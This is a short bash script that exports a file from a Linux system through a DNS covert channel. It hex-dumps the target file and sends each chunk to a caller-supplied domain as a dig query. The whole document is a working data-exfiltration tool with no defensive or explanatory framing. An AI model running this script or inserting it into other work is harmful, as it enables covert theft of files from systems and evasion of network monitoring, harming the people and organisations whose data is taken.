#!/bin/bash
#Export file from Linux systems via DNS channel
#To run: dns_export.sh targetFile uniqueIdentifier domainName

hexDump=`xxd -p $1` 
i=0
for line in $hexDump
do
	dig $line"."$((i++))"."$2"."$3
done

